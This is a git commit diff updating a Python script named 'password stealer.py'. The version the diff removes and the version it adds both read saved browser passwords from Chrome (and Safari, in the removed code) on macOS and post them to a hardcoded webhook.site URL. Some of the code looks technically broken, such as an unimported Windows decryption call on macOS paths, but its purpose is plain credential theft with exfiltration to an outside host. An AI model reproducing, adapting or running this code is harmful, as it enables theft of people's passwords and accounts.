04f1ae89d3c247310e0fa36116c51011fd4262c6
TOTOSOLEIL3 <66794099+TOTOSOLEIL3@users.noreply.github.com>
2023-02-28 00:14:19 +0100

    Update password stealer.py

--- password stealer.py
+++ password stealer.py
@@ -1,30 +1,34 @@
 import os
-import sqlite3
+import shutil
+import subprocess
 import requests
+import json
 
-def steal_chrome():
-    username = os.getlogin()
-    db_path = f"/Users/{username}/Library/Application Support/Google/Chrome/Default/Login Data"
-    conn = sqlite3.connect(db_path)
-    cursor = conn.cursor()
-    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-    for url, username, encrypted_password in cursor.fetchall():
-        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
-        requests.post("https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189", data=f"Chrome Password: {decrypted_password} for {username} on {url}")
-    cursor.close()
-    conn.close()
+# Chemin vers le dossier contenant les données de Chrome sur MacOS
+chrome_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default')
 
-def steal_safari():
-    username = os.getlogin()
-    db_path = f"/Users/{username}/Library/Safari/Passwords.db"
-    conn = sqlite3.connect(db_path)
-    cursor = conn.cursor()
-    cursor.execute("SELECT user, password, host FROM passwords")
-    for username, encrypted_password, url in cursor.fetchall():
-        decrypted_password = Security.SecKeychainFindInternetPassword(None, len(url), url, 0, None, len(username), username, 0, None, Security.kSecProtocolTypeAny, Security.kSecAuthenticationTypeAny, None, None, None)[2].decode()
-        requests.post("https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189", data=f"Safari Password: {decrypted_password} for {username} on {url}")
-    cursor.close()
-    conn.close()
+# Chemin vers le fichier contenant les mots de passe de Chrome
+login_db = os.path.join(chrome_path, 'Login Data')
 
-steal_chrome()
-steal_safari()
+# Copie du fichier Login Data pour éviter les problèmes de verrouillage
+temp_file = os.path.join(os.getcwd(), 'chrome_login_data')
+shutil.copy2(login_db, temp_file)
+
+# Exécution de l'outil de ligne de commande "security" pour extraire les mots de passe
+output = subprocess.check_output(f"security find-internet-password -s 'Chrome' -g {temp_file}", shell=True)
+
+# Suppression du fichier temporaire
+os.remove(temp_file)
+
+# Conversion de la sortie en chaîne de caractères et suppression des caractères de contrôle
+output = output.decode('utf-8').replace('\n', '').replace('\t', '')
+
+# Extraction du nom d'utilisateur et du mot de passe
+username = output.split('"acct"<blob>="')[1].split('"')[0]
+password = output.split('password: "')[1].split('"')[0]
+
+# Envoi du nom d'utilisateur et du mot de passe à un webhook
+webhook_url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
+data = {'username': username, 'password': password}
+headers = {'Content-type': 'application/json'}
+response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
